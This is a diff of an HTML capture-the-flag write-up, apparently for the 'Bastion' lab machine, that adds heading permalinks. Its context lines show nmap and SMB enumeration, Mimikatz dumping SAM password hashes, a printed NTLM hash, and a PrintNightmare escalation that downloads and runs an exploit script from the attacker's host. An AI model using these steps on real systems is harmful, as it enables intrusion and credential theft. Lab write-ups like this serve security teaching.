@@ -863,11 +863,11 @@
               
                 
                 
-                <h1 id="overview">Overview</h1>
+                <h1 id="overview">Overview<a class="headerlink" href="#overview" title="Permanent link">&para;</a></h1>
 <p><img alt="" src="../writeup.assets/image-20210702152950822.png" /></p>
-<h1 id="walkthrough">Walkthrough</h1>
-<h2 id="recon">Recon</h2>
-<h3 id="nmap">nmap</h3>
+<h1 id="walkthrough">Walkthrough<a class="headerlink" href="#walkthrough" title="Permanent link">&para;</a></h1>
+<h2 id="recon">Recon<a class="headerlink" href="#recon" title="Permanent link">&para;</a></h2>
+<h3 id="nmap">nmap<a class="headerlink" href="#nmap" title="Permanent link">&para;</a></h3>
 <div class="highlight"><pre><span></span><code>PORT    STATE SERVICE      REASON  VERSION
 <span class="m">22</span>/tcp  open  ssh          syn-ack OpenSSH for_Windows_7.9 <span class="o">(</span>protocol <span class="m">2</span>.0<span class="o">)</span>
 <span class="p">|</span> ssh-hostkey: 
@@ -882,7 +882,7 @@
 <span class="m">445</span>/tcp open  microsoft-ds syn-ack Windows Server <span class="m">2016</span> Standard <span class="m">14393</span> microsoft-ds
 Service Info: OSs: Windows, Windows Server <span class="m">2008</span> R2 - <span class="m">2012</span><span class="p">;</span> CPE: cpe:/o:microsoft:windows
 </code></pre></div>
-<h3 id="enumerating-smb-shares">Enumerating SMB Shares</h3>
+<h3 id="enumerating-smb-shares">Enumerating SMB Shares<a class="headerlink" href="#enumerating-smb-shares" title="Permanent link">&para;</a></h3>
 <div class="highlight"><pre><span></span><code>OldBoxes/bastian → smbclient -L <span class="se">\\\\</span><span class="m">10</span>.10.10.134 -U <span class="s1">&#39;anonymouse&#39;</span> -N 
 
     Sharename       Type      Comment
@@ -900,7 +900,7 @@ smb: <span class="se">\&gt;</span> timeout <span class="m">1000000</span>
 io_timeout per operation is now <span class="m">1000000</span>
 smb: <span class="se">\&gt;</span> mget * 
 </code></pre></div>
-<h3 id="enumerating-win-hard-disk">Enumerating Win Hard Disk</h3>
+<h3 id="enumerating-win-hard-disk">Enumerating Win Hard Disk<a class="headerlink" href="#enumerating-win-hard-disk" title="Permanent link">&para;</a></h3>
 <p>Run Mimikatz inside VHD to found the user <code>L4mpje</code> NTLM hash: <code>26112010952d963c8dc4217daec986d9</code></p>
 <div class="highlight"><pre><span></span><code>mimikatz <span class="c1"># lsadump::sam /system:SYSTEM /sam:SAM</span>
 Domain : L4MPJE-PC
@@ -945,8 +945,8 @@ l4mpje@BASTION C:<span class="se">\U</span>sers<span class="se">\L</span>4mpje&g
 <div class="highlight"><pre><span></span><code>l4mpje@BASTION C:<span class="se">\U</span>sers<span class="se">\L</span>4mpje<span class="se">\D</span>esktop&gt;more user.txt                                                                            
 9bfe57d5c3309db3a151772f9d86c6cd      
 </code></pre></div>
-<h2 id="privilege-escalation">Privilege Escalation</h2>
-<h3 id="printnightmare-cve-2021-1675">PrintNightmare (CVE 2021-1675)</h3>
+<h2 id="privilege-escalation">Privilege Escalation<a class="headerlink" href="#privilege-escalation" title="Permanent link">&para;</a></h2>
+<h3 id="printnightmare-cve-2021-1675">PrintNightmare (CVE 2021-1675)<a class="headerlink" href="#printnightmare-cve-2021-1675" title="Permanent link">&para;</a></h3>
 <div class="highlight"><pre><span></span><code><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">L4mpje</span><span class="p">\</span><span class="n">Videos</span><span class="p">&gt;</span> <span class="nb">Invoke-WebRequest</span> <span class="s2">&quot;http://10.10.14.27:9001/CVE-2021-1675.ps1&quot;</span>
 
 <span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">L4mpje</span><span class="p">\</span><span class="n">Videos</span><span class="p">&gt;</span> <span class="p">.</span> <span class="p">.\</span><span class="n">CVE</span><span class="p">-</span><span class="n">2021</span><span class="p">-</span><span class="n">1675</span><span class="p">.</span><span class="n">ps1</span>  
